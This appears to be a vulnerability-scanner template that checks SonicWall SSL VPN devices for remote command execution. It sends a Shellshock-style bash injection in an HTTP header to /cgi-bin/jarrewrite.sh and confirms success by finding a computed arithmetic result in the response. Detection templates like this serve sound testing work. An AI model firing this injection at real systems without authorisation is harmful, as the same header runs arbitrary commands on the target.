{
    "Name": "sonicwall-ssl-vpn-rce",
    "Description": "sonicwall-ssl-vpn-rce",
    "Product": "sonicwall",
    "author": "chumeng",
    "Request":[
                {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","X-Test":"() { :; }; echo ; /bin/bash -c 'expr 98547822 - 374587'"},
        "Uri":"/cgi-bin/jarrewrite.sh",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "98173235"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
